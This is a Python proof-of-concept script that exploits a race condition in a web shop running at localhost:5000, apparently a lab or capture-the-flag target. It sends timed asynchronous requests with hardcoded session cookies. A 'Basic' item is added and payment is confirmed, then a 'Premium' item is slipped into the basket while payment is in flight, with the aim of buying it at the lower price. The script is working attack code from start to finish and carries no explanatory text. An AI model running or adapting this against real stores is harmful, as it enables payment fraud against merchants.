import asyncio
import httpx

# Common headers
headers_common = {
    'Host': 'localhost:5000',
    'Connection': 'keep-alive'
}

# Add Basic to basket
url1 = 'http://localhost:5000/add_to_basket?q=Basic'
headers1 = headers_common.copy()
headers1.update({
    'Cookie': 'session=.eJwljksKAkEMBe_Saxed7iQz8TJD54ciKMzoSry7LS7rPSjqXbbc47iU83N_xalsVy_nkoumZ02hhhmECaYESd3cglckrZkUgUZi3o1GWyp0qork3mxFBo4gT5lEbAti1AEpDcZPlsBQs4fwAEWVbiGyOM6LuVqZIa8j9n8NTLRjz-35uMV9DgIRY-pCm2CT2QCq3bA3aKuyYx-zPaF8vtsjQLc.Z_q1kA.XZ3vLAPn28JMVDV01phYlHS1DEI'
})

# Make Payment
url2 = 'http://localhost:5000/confirm_order'
headers2 = headers_common.copy()
headers2.update({
    'Cookie': 'session=.eJwljksKAkEMBe_Saxed7iQz8TJD54ciKMzoSry7LS7rPSjqXbbc47iU83N_xalsVy_nkoumZ02hhhmECaYESd3cglckrZkUgUZi3o1GWyp0qork3mxFBo4gT5lEbAti1AEpDcZPlsBQs4fwAEWVbiGyOM6LuVqZIa8j9n8NTLRjz-35uMV9DgIRY-pCm2CT2QCq3bA3aKuyYx-zPaF8vtsjQLc.Z_q5KA.VtkoJqAE2N1_H9yu98PVlF0KrsI'
})

# Add Premium to basket
url3 = 'http://localhost:5000/add_to_basket?q=Premium'

# Async function to send a GET request
async def send_request(url, headers):
    async with httpx.AsyncClient(timeout=30.0) as client:
        response = await client.get(url, headers=headers)
        return f"URL: {url}, Status Code: {response.status_code}, Response: {response.text}"

# Main async function
async def main():
    task1 = asyncio.create_task(send_request(url1, headers1))
    await asyncio.sleep(1)
    task2 = asyncio.create_task(send_request(url2, headers2))
    await asyncio.sleep(1)
    task3 = asyncio.create_task(send_request(url3, headers1))
    result1, result2, result3 = await asyncio.gather(task1, task2, task3)

    print(result2)

if __name__ == '__main__':
    asyncio.run(main())